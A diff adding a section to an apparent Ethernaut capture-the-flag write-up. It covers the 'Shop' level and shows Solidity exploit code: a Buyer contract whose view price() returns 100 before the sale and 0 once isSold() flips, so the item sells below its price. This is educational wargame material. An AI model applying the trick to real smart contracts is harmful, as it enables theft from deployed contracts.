@@ -1386,3 +1386,71 @@ assert(false);
 
 * https://docs.soliditylang.org/en/v0.8.17/control-structures.html#error-handling-assert-require-revert-and-exceptions
 * https://ethereum.stackexchange.com/a/113362
+
+## 21 Shop
+
+To beat this level, we need to comply with
+
+```solidity
+_shop.price() < 100
+```
+
+### Solution
+
+There's a `buy()` function
+
+```solidity
+function buy() public {
+  Buyer _buyer = Buyer(msg.sender);
+
+  if (_buyer.price() >= price && !isSold) {
+    isSold = true;
+    price = _buyer.price();
+  }
+}
+```
+
+We need to provide the `Buyer` contract from the given interface
+
+```solidity
+interface Buyer {
+  function price() external view returns (uint);
+}
+```
+
+The difficulty we find is that they function `price()` that *we have to provide* is a `view`. As such, we cannot just add a boolean that we modify at the second visit, just like the [Elevator](#11-elevator) level.
+
+Now, the `Shop` contract has two variables
+
+```solidity
+contract Shop {
+  uint public price = 100;
+  bool public isSold;
+
+  // ...
+}
+```
+
+We can access the variable `bool public isSold;`, with `IsSold()`. To avoid compiler problems, as `price()` is a `view`, we just compose an interface `IShop`
+
+```solidity
+interface IShop {
+  function buy() external;
+  function isSold() external view returns (bool);
+}
+```
+
+Afterward we just write our `price()` function to complete the attack
+
+```solidity
+function price() public view returns (uint) {
+  if (challenge.isSold()) {
+    return 0;
+  }
+  return 100;
+}
+```
+
+### References
+
+* https://docs.soliditylang.org/en/v0.8.19/contracts.html#view-functions
